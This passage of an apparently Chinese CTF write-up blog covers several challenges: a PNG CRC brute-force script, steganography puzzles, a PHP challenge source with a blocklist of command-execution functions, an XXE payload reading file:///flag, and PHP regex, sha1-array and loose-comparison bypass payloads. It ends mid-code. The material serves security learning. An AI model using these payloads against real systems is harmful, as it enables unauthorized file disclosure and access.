class="hljs-number">9</span>CV<span class="hljs-number">9</span>rhmsAF<span class="hljs-number">7</span>gBkIGYjDGW<span class="hljs-number">18</span>CoATzuOtG<span class="hljs-number">4</span>BlADOOwdZLDSTygDowZQA/igwORgpSE/vFkXecDQ<span class="hljs-number">2</span>MCoAdQAagBfYBrG<span class="hljs-number">8</span>hoYNYAaQA<span class="hljs-number">2</span>gBvAFCnx<span class="hljs-number">9</span>SnL<span class="hljs-number">7</span>JCbbbwD<span class="hljs-number">9</span>BnB<span class="hljs-number">4</span>mslgpQE<span class="hljs-number">1</span>MHoD<span class="hljs-number">6</span>A<span class="hljs-number">2</span>gN<span class="hljs-number">4</span>DD<span class="hljs-number">67</span>v+gLG<span class="hljs-number">8</span>BkYNoAZQA<span class="hljs-number">1</span>jf<span class="hljs-number">58</span>MIxvIaGDWAGsCXGgDZnHQVJhi<span class="hljs-number">7</span>LQupiXBOtU/lufEguRJfck<span class="hljs-number">50</span>meLyy<span class="hljs-number">0</span>DTvwpMyJCiiDgkJvEhXBKG+ZOF<span class="hljs-number">5</span>Ep<span class="hljs-number">1</span>X<span class="hljs-number">7</span>EmwjnVTbQz<span class="hljs-number">8</span>tQAHnRisglpIEijyEBM<span class="hljs-number">1</span>kRypbqvWBPhnOom<span class="hljs-number">2</span>hl<span class="hljs-number">5</span>yFwlrvSc<span class="hljs-number">8</span>CV<span class="hljs-number">103</span>wprjeAOwqRRiVxrcEiXMjQEByrJiPXbjURbVIM<span class="hljs-number">0</span>YXUnfLQ<span class="hljs-number">8</span>xpADYDOyt<span class="hljs-number">84</span>MqBk<span class="hljs-number">0</span>FPiqTyWUad<span class="hljs-number">66</span>KslqZvkIjE<span class="hljs-number">1</span>gBoAmZN<span class="hljs-number">3</span>MWRAawCfy<span class="hljs-number">0</span>p<span class="hljs-number">0</span>Ifoebtq<span class="hljs-number">9</span>Oe<span class="hljs-number">9</span>HwPONIk<span class="hljs-number">0</span>wmmkNDcGxajJyEe<span class="hljs-number">2</span>MPL<span class="hljs-number">0</span>BPOj<span class="hljs-number">6</span>ZBOM<span class="hljs-number">4</span>SMDMVkTyZXqvmJNhHOqm<span class="hljs-number">2</span>hn<span class="hljs-number">5</span>KkB<span class="hljs-number">1</span>AA+KLDTYBEuuy<span class="hljs-number">0</span>L<span class="hljs-number">4</span>VwD+FwB<span class="hljs-number">0</span>sukHT<span class="hljs-number">3</span>vN<span class="hljs-number">4</span>AnfwMgjZhquLGUpB<span class="hljs-number">4</span>SY<span class="hljs-number">9</span>VMaiK<span class="hljs-number">5</span>CA<span class="hljs-number">6</span>pa<span class="hljs-number">6</span>cYVHe/ATz<span class="hljs-number">3</span>GwAZCNIogpNidhpyq<span class="hljs-number">2</span>ZSE<span class="hljs-number">8</span>lFcJK+u<span class="hljs-number">52</span>jumsANYCvGFwynIQXWVySi+AQPjvFoLprADWArxhaMpyEF<span class="hljs-number">1</span>lckovgED<span class="hljs-number">47</span>xaC<span class="hljs-number">6</span>awA<span class="hljs-number">1</span>gK<span class="hljs-number">8</span>YWjKchBdZXJKL<span class="hljs-number">4</span>BA+O<span class="hljs-number">8</span>WgumsANYCvGFoynIQXWVySi+AQPjvFoLprADWArxhaMpyEF<span class="hljs-number">1</span>lckovgED<span class="hljs-number">47</span>xaC<span class="hljs-number">6</span>awA<span class="hljs-number">1</span>gK<span class="hljs-number">8</span>YWjKchBdZXJKL<span class="hljs-number">4</span>BA+O<span class="hljs-number">8</span>WgumsANYCvGFoynIQXWVySi+AQPjvFoLoNA<span class="hljs-number">9</span>ipaNJIIgypycqVcAjfhHGrZzecpDHhmzBu<span class="hljs-number">55</span>PaED<span class="hljs-number">4</span>phtSt<span class="hljs-number">1</span>VQDSO<span class="hljs-number">24</span>f<span class="hljs-number">6414</span>e<span class="hljs-number">32</span>C<span class="hljs-number">5</span>n<span class="hljs-number">3</span>/<span class="hljs-number">4</span>wOROBiGklSntSdMGoAjxVSfhWYNGEqxlpKwtfKlXDIIiQMc<span class="hljs-number">3</span>EtPkljkidh<span class="hljs-number">1</span>ABqAB<span class="hljs-number">8</span>UuNpgEb<span class="hljs-number">41</span>gK+/qREzIjGj/e<span class="hljs-number">4</span>rAGnJ<span class="hljs-number">5</span>zFTSzc<span class="hljs-number">6</span>EH<span class="hljs-number">0</span>FuDsQpN/np+n/T<span class="hljs-number">472</span>uwZwvmVkIIxmGhh<span class="hljs-number">9</span>BXjcZ<span class="hljs-number">0</span>vj<span class="hljs-number">89</span>NUAzC<span class="hljs-number">00774</span>EjI<span class="hljs-number">1</span>gLVrd<span class="hljs-number">9</span>KYLGXC<span class="hljs-number">6</span>DeAfgPoN<span class="hljs-number">4</span>DfCpCFmjI<span class="hljs-number">1</span>sriEL<span class="hljs-number">8</span>HZqSbCl<span class="hljs-number">9</span>St<span class="hljs-number">1</span>dRXANKSfgP<span class="hljs-number">4</span>rwLWgCblSZ<span class="hljs-number">6</span>E<span class="hljs-number">0</span>RvA<span class="hljs-number">4</span>g<span class="hljs-number">2</span>ACHy<span class="hljs-number">1</span>GDJYmsOCj<span class="hljs-number">2</span>pJP<span class="hljs-number">8</span>I<span class="hljs-number">3</span>YdBFIDgWn<span class="hljs-number">5</span>RrsgdXqylpR<span class="hljs-number">8</span>/j<span class="hljs-number">7</span>wFQoCvFkWZPDl/SjvBNGDWAxwpZGqc+WHOV<span class="hljs-number">8</span>tDzGsAdpaxGEZzULGs<span class="hljs-number">4</span>DS<span class="hljs-number">43</span>rhafVDfhS<span class="hljs-number">7</span>hYOIkvOd+Jy<span class="hljs-number">68</span>fCukbACnqajGTQ<span class="hljs-number">0</span>ManvQjfBNGbwC<span class="hljs-number">9</span>AXymQA<span class="hljs-number">2</span>gNwDiHe<span class="hljs-number">9</span>iLENKiYl<span class="hljs-number">5</span>Ei<span class="hljs-number">4</span>WTuJLznfi<span class="hljs-number">0</span>hvAg<span class="hljs-number">45</span>ZjSI<span class="hljs-number">4</span>aXDIkCeM<span class="hljs-number">3</span>gB<span class="hljs-number">6</span>A+gN<span class="hljs-number">4</span>LcCZKHI<span class="hljs-number">4</span>lo<span class="hljs-number">4</span>aXlJnoRRA<span class="hljs-number">6</span>gB<span class="hljs-number">1</span>ABqAMQnYoxlSCnRpAlfraakHT<span class="hljs-number">3</span>vN<span class="hljs-number">4</span>B+A<span class="hljs-number">6</span>Cz<span class="hljs-number">8</span>jfuastiGclhoT<span class="hljs-number">55</span>YCcuN<span class="hljs-number">3</span>r/A/<span class="hljs-number">9</span>UuYk<span class="hljs-number">1</span>jluJAAAAAElFTkSuQmCC<br></code></pre></td></tr></table></figure>

<p>访问得到二维码图片</p>
<p>再扫码得到flag</p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p><a href="https://blog.csdn.net/mochu7777777/article/details/111144417">(1条消息) BMZCTF：真正的CTFer_末初 · mochu7-CSDN博客</a></p>
<p>这题思路早有</p>
<p>因为一打开010提示CRC问题，就是不懂怎么修改</p>
<p>然后找了好几个脚本全部失败</p>
<p>最后直接用这篇文章的payload</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> struct<br><span class="hljs-attribute">import</span> zlib<br><br><span class="hljs-attribute">def</span> hexStr<span class="hljs-number">2</span>bytes(s):<br>    <span class="hljs-attribute">b</span> = b<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>,len(s),<span class="hljs-number">2</span>):<br>        <span class="hljs-attribute">temp</span> = s[i:i+<span class="hljs-number">2</span>]<br>        <span class="hljs-attribute">b</span> +=struct.pack(<span class="hljs-string">&quot;B&quot;</span>,int(temp,<span class="hljs-number">16</span>))<br>    <span class="hljs-attribute">return</span> b<br><br><span class="hljs-attribute">str1</span>=<span class="hljs-string">&quot;49484452&quot;</span>#Chunk[<span class="hljs-number">0</span>] IHDR<br><span class="hljs-attribute">str2</span>=<span class="hljs-string">&quot;0806000000&quot;</span>#Bit depth、ColorType、Compression method、Filter method、Interlace method<br><span class="hljs-attribute">bytes1</span>=hexStr<span class="hljs-number">2</span>bytes(str<span class="hljs-number">1</span>)<br><span class="hljs-attribute">bytes2</span>=hexStr<span class="hljs-number">2</span>bytes(str<span class="hljs-number">2</span>)<br><span class="hljs-attribute">wid</span>,hei = <span class="hljs-number">1308</span>,<span class="hljs-number">1280</span>#当前宽高<br><br><span class="hljs-attribute">crc32</span> = <span class="hljs-string">&quot;0x6f03ad71&quot;</span>#图片原来的CRC<br><br><span class="hljs-attribute">for</span> w in range(wid,wid+<span class="hljs-number">2000</span>):<br>    <span class="hljs-attribute">for</span> h in range(hei,hei+<span class="hljs-number">2000</span>):<br>        <span class="hljs-attribute">width</span> = hex(w)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,&#x27;<span class="hljs-number">0</span>&#x27;)<br>        <span class="hljs-attribute">height</span> = hex(h)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">8</span>,&#x27;<span class="hljs-number">0</span>&#x27;)<br>        <span class="hljs-attribute">bytes_temp</span>=hexStr<span class="hljs-number">2</span>bytes(width+height)<br>        <span class="hljs-attribute">if</span> eval(hex(zlib.crc<span class="hljs-number">32</span>(bytes<span class="hljs-number">1</span>+bytes_temp+bytes<span class="hljs-number">2</span>))) == eval(crc<span class="hljs-number">32</span>):<br>            <span class="hljs-attribute">print</span>(hex(w),hex(h))<br></code></pre></td></tr></table></figure>

<p>最后steg</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/20201213201735422.png" alt="在这里插入图片描述"></p>
<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><p><a href="https://shawroot.hatenablog.com/entry/2019/09/14/BUUCTF-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B">BUUCTF-谁赢了比赛 - 「配枪朱丽叶。」 (hatenablog.com)</a></p>
<p>这题围棋挺有趣的</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211017181636138.png" alt="image-20211017181636138"></p>
<p>一开始给了图片，将其后缀改为.zip来得到一个压缩包</p>
<p>里面有加密的文本</p>
<p>用apchpr爆破一下得到密码:1020</p>
<p>打开后有hehe.gif</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211017181833624.png" alt="image-20211017181833624"></p>
<p>放到steg查看</p>
<p>最后二维码扫描得到flag</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/SLKfMhb1r5ZUcVJ.png" alt="img"></p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2020 朱雀组 phpweb&amp;NCTF2019 Fake XML cookbook</title>
    <url>/2021/08/11/2021/buu/11/</url>
    <content><![CDATA[<h3 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h3><p>XML可能存在的漏洞:<br>XML注入和XPath注入XML 外部实体注入</p>
<p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签</p>
<p><strong>XXE攻击</strong><br>附上链接：</p>
<p><a href="https://xz.aliyun.com/t/6887**%E4%BB%8EXML%E7%9B%B8%E5%85%B3%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%88%B0XXE%E6%BC%8F%E6%B4%9E">https://xz.aliyun.com/t/6887**从XML相关一步一步到XXE漏洞</a>**</p>
<p>XXE(XML External Entity Injection)全称为XML外部实体注入</p>
<p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户</a><strong>浅谈XML实体注入漏洞</strong></p>
<h3 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h3><h4 id="网鼎杯-2020-朱雀组"><a href="#网鼎杯-2020-朱雀组" class="headerlink" title="网鼎杯 2020 朱雀组"></a>网鼎杯 2020 朱雀组</h4><p><img src="/2021/08/11/2021/buu/11/image-20210811193932874.png" alt="image-20210811193932874"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params">$func, $p</span>) </span>&#123;<br>        $result = call_user_func($func, $p);<br>        $a= gettype($result);<br>        <span class="hljs-keyword">if</span> ($a == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> $result;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> $p = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> $func = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> gettime(<span class="hljs-keyword">$this</span>-&gt;func, <span class="hljs-keyword">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    $func = $_REQUEST[<span class="hljs-string">&quot;func&quot;</span>];<br>    $p = $_REQUEST[<span class="hljs-string">&quot;p&quot;</span>];<br>    <span class="hljs-keyword">if</span> ($func != <span class="hljs-literal">null</span>) &#123;<br>    $func = strtolower($func);<br>    <span class="hljs-keyword">if</span> (!in_array($func,$disable_fun)) &#123;<br>        <span class="hljs-keyword">echo</span> gettime($func, $p);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/11/2021/buu/11/image-20210811194437549.png" alt="image-20210811194437549"></p>
<h4 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="NCTF2019 Fake XML cookbook"></a>NCTF2019 Fake XML cookbook</h4><p>这题解题挺快的，有点像之前的sql注入</p>
<p>这次是进行恶意实体注入</p>
<p><img src="/2021/08/11/2021/buu/11/image-20210812153137919.png" alt="image-20210812153137919"></p>
<p>尝试admin，抓个包</p>
<p><img src="/2021/08/11/2021/buu/11/image-20210812153237740.png" alt="image-20210812153237740"></p>
<p>看到了POST提交数据后的页面</p>
<p>我们查看无输入数据的页面源代码</p>
<p>找到关键代码段</p>
<p><img src="/2021/08/11/2021/buu/11/image-20210812153441742.png" alt="image-20210812153441742"></p>
<pre><code>function doLogin()&#123;
    var username = $(&quot;#username&quot;).val();
    var password = $(&quot;#password&quot;).val();
    if(username == &quot;&quot; || password == &quot;&quot;)&#123;
        alert(&quot;Please enter the username and password!&quot;);
        return;
    &#125;
var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; 
$.ajax(&#123;
    type: &quot;POST&quot;,
    url: &quot;doLogin.php&quot;,
    contentType: &quot;application/xml;charset=utf-8&quot;,
    data: data,
    dataType: &quot;xml&quot;,
    anysc: false,
    success: function (result) &#123;
        var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
        var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;
        if(code == &quot;0&quot;)&#123;
            $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);
        &#125;else if(code == &quot;1&quot;)&#123;
            $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);
        &#125;else&#123;
            $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);
        &#125;
    &#125;,
    error: function (XMLHttpRequest,textStatus,errorThrown) &#123;
        $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);
    &#125;
&#125;); 
&#125;</code></pre>
<p><strong>摘抄：</strong></p>
<p><strong>XML可能存在的漏洞：</strong><br>XML注入和XPath注入XML 外部实体注入</p>
<p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签</p>
<p><strong>XXE攻击</strong><br>附上链接：</p>
<p><a href="https://xz.aliyun.com/t/6887">https://xz.aliyun.com/t/6887</a></p>
<p>XXE(XML External Entity Injection)全称为XML外部实体注入</p>
<p>Payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">admin</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/11/2021/buu/11/image-20210812154303323.png" alt="image-20210812154303323"></p>
<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p> <a href="https://blog.csdn.net/devilare/article/details/118969558">NCTF2019]Fake XML cookbook_devilare的博客-CSDN博客</a></p>
<p> <a href="https://blog.csdn.net/SopRomeo/article/details/105913611">NCTF2019]Fake XML cookbook_SopRomeo的博客-CSDN博客</a></p>
<p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12323562.html">NCTF2019]Fake XML cookbook - 王叹之 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>2021鹤城杯</title>
    <url>/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</url>
    <content><![CDATA[<pre><code> 这次的比赛虽然听说都是原题，但是基本没遇到过，这次看着writeup总结一下</code></pre>
<p> 复现一下某些题目</p>
<h3 id="Middle-magic"><a href="#Middle-magic" class="headerlink" title="Middle magic"></a>Middle magic</h3><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./flag.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./result.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]) &lt; <span class="hljs-number">20</span>)&#123;<br><br>    $aaa = preg_replace(<span class="hljs-string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="hljs-string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;aaa&#x27;</span>]);<br><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/pass_the_level_1#/&#x27;</span>, $aaa))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 2&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>] == $_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-comment">// START FORM PROCESSING    </span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;<br>                    $level_3 = json_decode($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>]);<br>                    <br>                    <span class="hljs-keyword">if</span> ($level_3-&gt;result == $result) &#123;<br>                        <br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success:&quot;</span>.$flag;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you never beat me!&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;out&quot;</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>            &#125;<br>        <span class="hljs-comment">// perform validations on the form data</span><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;<br>        &#125;<br><br>    &#125;<br>    <br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono!&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>第一层绕过</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">$aaa = preg_replace(&#x27;/^(.*)level(.*)$/&#x27;, &#x27;$&#123;1&#125;<span class="hljs-comment">&lt;!-- filtered --&gt;</span>$&#123;2&#125;&#x27;, $_GET[&#x27;aaa&#x27;]);<br><br>   if(preg_match(&#x27;/pass_the_level_1#/&#x27;, $aaa))&#123;<br>       echo &quot;here is level 2&quot;;<br></code></pre></td></tr></table></figure>

<p>get类型取得变量a的值，正则替换和匹配函数</p>
<p>这里直接用%0a和%23绕过</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">?aaa=%<span class="hljs-number">0</span>apass_the_level_1%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>第二层绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])) &#123;<br>           <span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>] == $_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>])<br>               <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;<br>       <span class="hljs-comment">// START FORM PROCESSING    </span><br>           <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_POST[<span class="hljs-string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="hljs-string">&#x27;root_pwd&#x27;</span>]))&#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>md5数组绕过</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">admin[]=<span class="hljs-number">1</span>&amp;root_pwd[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>第三层绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>])) &#123;<br>                  $level_3 = json_decode($_POST[<span class="hljs-string">&#x27;level_3&#x27;</span>]);<br>                  <br>                  <span class="hljs-keyword">if</span> ($level_3-&gt;result == $result) &#123;<br></code></pre></td></tr></table></figure>

<p>要经过js-encode编码一下，虽然我们不懂值是多少，但弱等于就好了</p>
<p>直接{“result”:0}</p>
<p>最后：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>：?aaa=%<span class="hljs-number">0</span>apass_the_level_<span class="hljs-number">1</span>%<span class="hljs-number">23</span><br><br><span class="hljs-attribute">POST</span>:admin[]=<span class="hljs-number">1</span>&amp;root_pwd[]=<span class="hljs-number">2</span>&amp;level_<span class="hljs-number">3</span>=&#123;<span class="hljs-string">&quot;result&quot;</span>:<span class="hljs-number">0</span>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h3><p>这题当初只有稍微看了看，没想到竟然有类似的原题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    $guess = (<span class="hljs-keyword">string</span>) $_POST[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ($guess === $secret) &#123;<br>        $message = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . $flag;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $message = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span 